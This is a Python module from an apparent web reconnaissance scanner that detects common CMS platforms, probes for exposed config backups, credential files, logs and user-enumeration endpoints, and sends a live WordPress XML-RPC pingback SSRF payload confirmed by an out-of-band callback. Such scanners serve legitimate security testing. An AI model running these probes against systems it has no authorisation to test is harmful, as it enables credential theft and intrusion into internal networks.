"""
CMSScannerModule — YATA RECON module.
Detects common CMS and checks for known vulnerable paths.
"""
import re
import time
import urllib.parse
import shutil

try:
    import requests
except ImportError:
    requests = None

from recon.modules import BaseModule


class CMSScannerModule(BaseModule):
    NAME = "CMS Scanner"

    def run(self):
        self.ui.section("CMS Detection & Scanning")
        if not requests:
            return

        s = self._session()
        try:
            resp = s.get(self.base_url, timeout=self.timeout)
        except Exception:
            return

        cms_detected = None
        version = None

        # 1. Detect CMS
        if "wp-content" in resp.text or "wp-includes" in resp.text:
            cms_detected = "WordPress"
            # Real WP sites vary quote style ('...' vs "...") and sometimes
            # self-close the meta tag — a double-quote-only regex missed
            # every single-quoted generator tag (a large fraction in
            # practice), silently losing version disclosure for them.
            match = re.search(r'name=["\']generator["\']\s+content=["\']WordPress ([\d.]+)', resp.text, re.I)
            if match:
                version = match.group(1)
        elif "Joomla" in resp.text or re.search(r'name="generator" content="Joomla', resp.text):
            cms_detected = "Joomla"
        elif "Magento" in resp.text or "Mage.Cookies" in resp.text or "/skin/frontend/" in resp.text:
            cms_detected = "Magento"
        elif "Drupal" in resp.text or "X-Drupal-Cache" in resp.headers:
            cms_detected = "Drupal"
            match = re.search(r'name=["\']Generator["\']\s+content=["\']Drupal ([\d.]+)', resp.text, re.I)
            if match:
                version = match.group(1)

        if not cms_detected:
            self.ui.info("No common CMS (WordPress, Joomla, Drupal) detected.")
            return

        self.ui.info(f"Detected CMS: {cms_detected}" + (f" (Version: {version})" if version else ""))
        
        # Add informational finding for detection
        self.db.add(
            title=f"CMS Detected: {cms_detected}",
            severity="info", url=self.base_url, module=self.NAME,
            description=f"The application is built using {cms_detected} {version or ''}.",
            cvss="0.0",
            confidence="CONFIRMED",
            confidence_score=95
        )

        # 2. Check vulnerable paths
        paths_to_check = []
        if cms_detected == "WordPress":
            paths_to_check = [
                ("/wp-json/wp/v2/users", "User Enumeration API"),
                ("/xmlrpc.php", "XML-RPC API (Brute Force/Pingback)"),
                ("/wp-config.php.bak", "Config Backup"),
                ("/wp-config.php~", "Config Backup"),
                ("/wp-config.php.save", "Config Backup"),
                ("/wp-content/debug.log", "Debug Log Exposed"),
                ("/readme.html", "Version Disclosure"),
                ("/wp-content/uploads/", "Uploads Directory Listing"),
            ]
            if shutil.which("wpscan"):
                 self.ui.info("WPScan is installed! Run it for a deeper WordPress analysis.")
        elif cms_detected == "Joomla":
            paths_to_check = [
                ("/configuration.php~", "Backup Configuration"),
                ("/configuration.php.bak", "Backup Configuration"),
                ("/administrator/manifests/files/joomla.xml", "Joomla XML Manifest"),
                ("/htaccess.txt", "htaccess Template Disclosure"),
            ]
        elif cms_detected == "Drupal":
            paths_to_check = [
                ("/CHANGELOG.txt", "Changelog (Version Disclosure)"),
                ("/core/install.php", "Install script"),
                ("/sites/default/settings.php.bak", "Settings Backup"),
                ("/user/register", "User Registration Open"),
            ]
        elif cms_detected == "Magento":
            paths_to_check = [
                ("/app/etc/local.xml", "Local Config (Legacy — DB Credentials)"),
                ("/app/etc/env.php", "Env Config (Magento 2 — DB Credentials)"),
                ("/downloader/", "Magento Connect Downloader Exposed"),
                ("/var/log/system.log", "System Log Exposed"),
            ]

        baseline = self.ctx.get("baseline_profile")
        for path, desc in paths_to_check:
            try:
                url = urllib.parse.urljoin(self.base_url, path)
                check_resp = s.get(url, timeout=self.timeout)
                if check_resp.status_code != 200 or len(check_resp.text) <= 10:
                    continue

                # Soft-404 / SPA catch-all guard — a site that returns 200 with
                # the same structural page for any path would otherwise flag
                # every single one of these as "exposed".
                if baseline and baseline.matches_soft_404(check_resp.text, check_resp.status_code):
                    continue

                # For the WP users API, require an actual JSON array of user
                # objects — substring checks for "id"/"name" pass on any page
                # containing those words at all (e.g. a login form).
                if path == "/wp-json/wp/v2/users":
                    try:
                        data = check_resp.json()
                    except Exception:
                        continue
                    if not (isinstance(data, list) and data and isinstance(data[0], dict)
                            and "id" in data[0] and "name" in data[0]):
                        continue
                elif "text/html" in check_resp.headers.get("Content-Type", "") and path.endswith((".txt", "~")):
                    continue  # HTML returned for what should be a plain-text/backup file

                verdict = self._classify_cms_path(path, desc, check_resp)
                if verdict is None:
                    # Path returns 200 but the condition the finding would
                    # claim (open registration, a directory listing, a real
                    # backup/config body) was NOT confirmed — a plain 200 on a
                    # path that exists on every normal install is not a finding.
                    continue
                severity, score, note = verdict
                cvss = {"medium": "5.3", "low": "3.1", "info": "0.0"}.get(severity, "5.3")
                label = ("HIGH" if score >= 75 else "MEDIUM" if score >= 50 else "LOW")
                added = self.db.add(
                    title=f"{cms_detected} — {desc}",
                    severity=severity, url=url, module=self.NAME,
                    description=f"CMS path '{path}' is accessible. {note}",
                    remediation="Restrict access to this path.",
                    cvss=cvss,
                    confidence=label,
                    confidence_score=score,
                    validation_steps=["status_200", "soft_404_checked", "content_confirmed"],
                )
                if added:
                    self.ui.find(severity, f"CMS Path Exposed: {desc}", url)
            except Exception:
                pass
            time.sleep(self.delay)  # was missing entirely — this loop ignored --delay completely

        # WordPress XML-RPC pingback SSRF — a textbook SSRF primitive baked
        # into WP core itself (not a plugin bug), confirmed via OOB callback
        # since the pingback verification response never reflects anything.
        if cms_detected == "WordPress":
            self._test_xmlrpc_pingback_ssrf(s)

    def _classify_cms_path(self, path, desc, resp):
        """Decide whether a 200 on a known CMS path is actually a finding, and
        at what severity — a plain 200 is not enough for paths that exist on
        every normal install. Returns (severity, confidence_score, note) or
        None to skip.

        * Directory listings must actually BE a listing ('Index of ...').
        * 'Registration open' must show a real registration form and not a
          'registration disabled' notice.
        * Version/endpoint disclosure (readme/CHANGELOG/xmlrpc) is real but
          minor → low, and xmlrpc must look like a real XML-RPC endpoint.
        * Backups/logs/config files that genuinely return content stay medium.
        """
        body = resp.text or ""
        low = body.lower()
        dl = desc.lower()
        ct = resp.headers.get("Content-Type", "").lower()

        # Directory listing — require an actual autoindex listing.
        if "directory listing" in dl or path.endswith("/uploads/") or path.endswith("/downloader/"):
            if re.search(r"<title>\s*index of\s+/|<h1>\s*index of\s+/|\[to parent directory\]", low):
                return ("medium", 80, "Directory listing is enabled and exposes file names.")
            return None

        # Open registration — a real form, not a disabled/▸login page.
        if "registration" in dl:
            disabled = any(x in low for x in (
                "registration is disabled", "registration is not", "not currently accepting",
                "only site administrators can create", "registration is currently closed",
            ))
            has_form = ("<form" in low and ("pass" in low or "password" in low)
                        and ("register" in low or "create new account" in low or "sign up" in low))
            if has_form and not disabled:
                return ("medium", 70, "A working public registration form is exposed.")
            return None

        # Version / endpoint disclosure — real but low value.
        if "version disclosure" in dl or "changelog" in dl or path.endswith(("readme.html", "changelog.txt")):
            return ("low", 60, "Discloses the exact CMS/component version (useful for targeted exploits).")
        if "xml-rpc" in dl or path.endswith("xmlrpc.php"):
            if "xml-rpc server accepts post" in low or "methodresponse" in low or "xmlrpc" in low:
                return ("low", 60, "XML-RPC endpoint is reachable (brute-force / pingback surface).")
            return None

        # Backups / logs / config files — HTML here means a catch-all page, not
        # the real file, so require a non-HTML body with real content.
        if "text/html" in ct or low.lstrip().startswith(("<!doctype", "<html")):
            return None
        if len(body.strip()) < 20:
            return None
        return ("medium", 85, "A sensitive backup/config/log file is directly accessible.")

    def _test_xmlrpc_pingback_ssrf(self, s):
        """WordPress's pingback.ping XML-RPC method makes the SERVER fetch
        an attacker-supplied sourceURI to "verify" the pingback — a genuine
        SSRF primitive, not a bug in a specific plugin. Confirmed the same
        way as ssrf.py: an OOB callback proves the server made the request,
        independent of anything in the (always generic) XML-RPC response."""
        try:
            from recon.core.oast import OASTClient
        except Exception:
            return False

        oast = OASTClient(self.ui)
        if not oast.available:
            return False
        if not oast.start():
            return False

        found = False
        try:
            label, oob_url = oast.label_url()
            xmlrpc_url = urllib.parse.urljoin(self.base_url, "/xmlrpc.php")
            pingback_xml = (
                '<?xml version="1.0"?>\n'
                '<methodCall><methodName>pingback.ping</methodName><params>'
                f'<param><value><string>{oob_url}</string></value></param>'
                f'<param><value><string>{self.base_url}/</string></value></param>'
                '</params></methodCall>'
            )
            try:
                s.post(xmlrpc_url, data=pingback_xml, headers={"Content-Type": "text/xml"}, timeout=self.timeout)
            except Exception:
                pass

            self.ui.info("Sent WordPress XML-RPC pingback SSRF probe — waiting for OOB callback...")
            interactions = oast.poll(wait=12.0)
        finally:
            oast.stop()

        for interaction in interactions:
            if oast.interaction_label(interaction) == label:
                self.db.add(
                    title="WordPress XML-RPC Pingback SSRF (OOB-Confirmed)",
                    severity="critical", url=xmlrpc_url, module=self.NAME,
                    description=(
                        "The XML-RPC pingback.ping method made the server issue an outbound "
                        "request to a URL we control, confirmed via an out-of-band interactsh "
                        "callback — a textbook SSRF built into WordPress core itself. Can be "
                        "used to port-scan the internal network, reach cloud metadata "
                        "endpoints, or attack internal-only services from the server's own "
                        "network position."
                    ),
                    remediation=(
                        "Disable the pingback.ping XML-RPC method (e.g. a plugin like "
                        "'Disable XML-RPC Pingback', or block XML-RPC entirely if unused), or "
                        "restrict outbound requests from the web server at the network level."
                    ),
                    cvss="8.6", confidence="CONFIRMED", confidence_score=97,
                    validation_steps=["pingback_ping_sent", "oob_interaction_received"],
                    evidence=[f"Protocol: {interaction.get('protocol', 'dns/http')}"],
                )
                self.ui.find("critical", "WordPress XML-RPC Pingback SSRF (OOB)", xmlrpc_url)
                found = True
                break

        return found
